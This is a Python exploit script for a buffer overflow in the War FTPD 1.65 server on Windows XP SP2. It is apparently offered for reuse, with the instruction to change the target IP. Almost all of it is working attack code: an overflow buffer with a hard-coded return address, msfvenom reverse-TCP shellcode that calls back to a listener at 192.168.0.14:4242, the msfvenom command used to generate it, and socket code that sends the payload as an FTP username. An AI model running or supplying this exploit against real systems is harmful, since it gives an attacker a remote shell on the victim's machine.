#!/usr/bin/python
#
# Exploit War FTPD version 165 for Win XP Service Pack 2
# Just Change Remote IP (rhost) variable, and lhost for msfvenom shellcode.
#
import socket, time

rhost="192.168.206.128"

offset = "A" * 485
eip = "\x27\xb1\xfa\x77"
# 16 null bytes for before shellcode
shellcode =  "\x90" * 16
# Run msfvenom to create a shellcode. Remember to change lhost to your local IP. Change lport if you want.
# Badchars are \x00\x0a\x0d\x40
# msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.14 lport=4242 EXITFUNC=thread -b '\x00\x0a\x0d\x40' -a x86 --platform Windows --var-name='shellcode' -f python
shellcode += b"\xba\x9d\x9b\x42\xda\xd9\xeb\xd9\x74\x24\xf4"
shellcode += b"\x5f\x31\xc9\xb1\x52\x83\xc7\x04\x31\x57\x0e"
shellcode += b"\x03\xca\x95\xa0\x2f\x08\x41\xa6\xd0\xf0\x92"
shellcode += b"\xc7\x59\x15\xa3\xc7\x3e\x5e\x94\xf7\x35\x32"
shellcode += b"\x19\x73\x1b\xa6\xaa\xf1\xb4\xc9\x1b\xbf\xe2"
shellcode += b"\xe4\x9c\xec\xd7\x67\x1f\xef\x0b\x47\x1e\x20"
shellcode += b"\x5e\x86\x67\x5d\x93\xda\x30\x29\x06\xca\x35"
shellcode += b"\x67\x9b\x61\x05\x69\x9b\x96\xde\x88\x8a\x09"
shellcode += b"\x54\xd3\x0c\xa8\xb9\x6f\x05\xb2\xde\x4a\xdf"
shellcode += b"\x49\x14\x20\xde\x9b\x64\xc9\x4d\xe2\x48\x38"
shellcode += b"\x8f\x23\x6e\xa3\xfa\x5d\x8c\x5e\xfd\x9a\xee"
shellcode += b"\x84\x88\x38\x48\x4e\x2a\xe4\x68\x83\xad\x6f"
shellcode += b"\x66\x68\xb9\x37\x6b\x6f\x6e\x4c\x97\xe4\x91"
shellcode += b"\x82\x11\xbe\xb5\x06\x79\x64\xd7\x1f\x27\xcb"
shellcode += b"\xe8\x7f\x88\xb4\x4c\xf4\x25\xa0\xfc\x57\x22"
shellcode += b"\x05\xcd\x67\xb2\x01\x46\x14\x80\x8e\xfc\xb2"
shellcode += b"\xa8\x47\xdb\x45\xce\x7d\x9b\xd9\x31\x7e\xdc"
shellcode += b"\xf0\xf5\x2a\x8c\x6a\xdf\x52\x47\x6a\xe0\x86"
shellcode += b"\xc8\x3a\x4e\x79\xa9\xea\x2e\x29\x41\xe0\xa0"
shellcode += b"\x16\x71\x0b\x6b\x3f\x18\xf6\xfc\x80\x75\xf8"
shellcode += b"\xf2\x68\x84\xf8\x1a\xfb\x01\x1e\x70\xeb\x47"
shellcode += b"\x89\xed\x92\xcd\x41\x8f\x5b\xd8\x2c\x8f\xd0"
shellcode += b"\xef\xd1\x5e\x11\x85\xc1\x37\xd1\xd0\xbb\x9e"
shellcode += b"\xee\xce\xd3\x7d\x7c\x95\x23\x0b\x9d\x02\x74"
shellcode += b"\x5c\x53\x5b\x10\x70\xca\xf5\x06\x89\x8a\x3e"
shellcode += b"\x82\x56\x6f\xc0\x0b\x1a\xcb\xe6\x1b\xe2\xd4"
shellcode += b"\xa2\x4f\xba\x82\x7c\x39\x7c\x7d\xcf\x93\xd6"
shellcode += b"\xd2\x99\x73\xae\x18\x1a\x05\xaf\x74\xec\xe9"
shellcode += b"\x1e\x21\xa9\x16\xae\xa5\x3d\x6f\xd2\x55\xc1"
shellcode += b"\xba\x56\x75\x20\x6e\xa3\x1e\xfd\xfb\x0e\x43"
shellcode += b"\xfe\xd6\x4d\x7a\x7d\xd2\x2d\x79\x9d\x97\x28"
shellcode += b"\xc5\x19\x44\x41\x56\xcc\x6a\xf6\x57\xc5"

buffer = offset + eip + shellcode

print "Buffer Overflow created by solislu"
print "--- Happy Hacking ---"
print "Buffer Overflow (USER) - WarFTP 165"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((rhost, 21))
except:
    print ("[-] Connection error!")
    sys.exit(1)

print s.recv(1024)
print "Sending malicious username..."
s.send('USER ' + buffer + '\r\n')
print s.recv(1024)
print "Sending pass..."
s.send('PASS test \r\n')
print s.recv(1024)
s.close()
